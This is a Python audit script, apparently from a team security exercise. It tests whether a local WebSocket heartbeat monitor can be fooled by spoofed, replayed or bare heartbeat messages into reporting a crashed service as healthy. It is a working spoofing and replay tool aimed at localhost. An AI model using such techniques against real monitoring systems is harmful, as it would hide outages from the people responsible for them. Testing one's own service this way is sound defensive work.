# At least one team member should take on the role of an adversarial auditor to analyze
# and test vulnerabilities in the heartbeat channel:
#  Attack 1 – Heartbeat Spoofing: Can an external script transmit fake heartbeat
# messages to the monitor so that the monitor reports the service is healthy even
# after the critical process has crashed?
#  Attack 2 – Replay Attack/Tampering: If the heartbeat payload includes status data
# or a timestamp, can an attacker capture a valid packet and replay it indefinitely
# to mask downtime?

import argparse
import ast
import asyncio
import json
import math
import time
from datetime import datetime, timezone
from pathlib import Path

from websockets.asyncio.client import connect
from websockets.exceptions import ConnectionClosed

MONITOR_URL = "ws://127.0.0.1:8000"


def capture_logged_heartbeat(log_path):
    """Retrieve one genuine payload previously recorded by the monitor."""
    marker = "Heartbeat received: "

    for line in reversed(Path(log_path).read_text().splitlines()):
        if marker not in line:
            continue

        payload = ast.literal_eval(line.split(marker, 1)[1])

        if isinstance(payload, dict) and payload.get("type") == "heartbeat":
            return json.dumps(payload)

    raise ValueError("No recorded heartbeat found; run the real service first.")

async def run_attack(args):
    replay_message = None
    deadline = None
    sequence = 1
    print("Attack armed; waiting for the monitor's heartbeat slot.", flush=True)

    while deadline is None or time.monotonic() < deadline:
        if args.mode == "replay" and replay_message is None:
            try:
                replay_message = capture_logged_heartbeat(args.log)
            except (FileNotFoundError, ValueError):
                await asyncio.sleep(0.5)
                continue
            print(f"Captured payload: {replay_message}", flush=True)

        try:
            async with connect(MONITOR_URL, ping_interval=None, open_timeout=2) as websocket:
                # A successful WebSocket handshake alone doesn't mean the monitor accepted us: it rejects second clients with 1008.
                ready = json.loads(await asyncio.wait_for(websocket.recv(), timeout=2))
                if ready != {"type": "ready"}:
                    raise ValueError("Unexpected monitor admission message.")
                if deadline is None:
                    deadline = time.monotonic() + args.duration
                    print("Attack active; took over the monitor's heartbeat slot.", flush=True)
                else:
                    print("Attack reconnected.", flush=True)

                while time.monotonic() < deadline:
                    if args.mode == "false-liveness":
                        message = json.dumps({"type": "heartbeat"})
                    elif replay_message is not None:
                        message = replay_message
                    else:
                        message = json.dumps({
                            "type": "heartbeat",
                            "sequence": sequence,
                            "timestamp": datetime.now(timezone.utc).isoformat(),
                        })
                    await websocket.send(message)
                    print(f"{args.mode}: {message}", flush=True)
                    sequence += 1
                    await asyncio.sleep(min(args.interval, max(0, deadline - time.monotonic())))
        except (OSError, ConnectionClosed, TimeoutError):
            # Stay armed while the real service owns the slot, don't reset an active attack's timer.
            await asyncio.sleep(0.5)

    print("Attack finished; watch for the monitor's timeout alert.")


def main():
    parser = argparse.ArgumentParser(description="Local heartbeat audit")
    parser.add_argument("mode", choices=["spoof", "replay", "false-liveness"])
    parser.add_argument("--interval", type=float, default=2.0)
    parser.add_argument("--duration", type=float, default=30.0,
                        help="Seconds to attack after admission; waiting time is excluded.")
    parser.add_argument("--log", default="heartbeat.log")
    args = parser.parse_args()

    if not all(math.isfinite(value) and value > 0 for value in (args.interval, args.duration)):
        parser.error("Interval and duration must be finite and positive.")

    try:
        asyncio.run(run_attack(args))
    except KeyboardInterrupt:
        print("\nAttack stopped.")
    except (OSError, ValueError, SyntaxError, ConnectionClosed) as error:
        raise SystemExit(f"Audit failed: {error}") from error


if __name__ == "__main__":
    main()
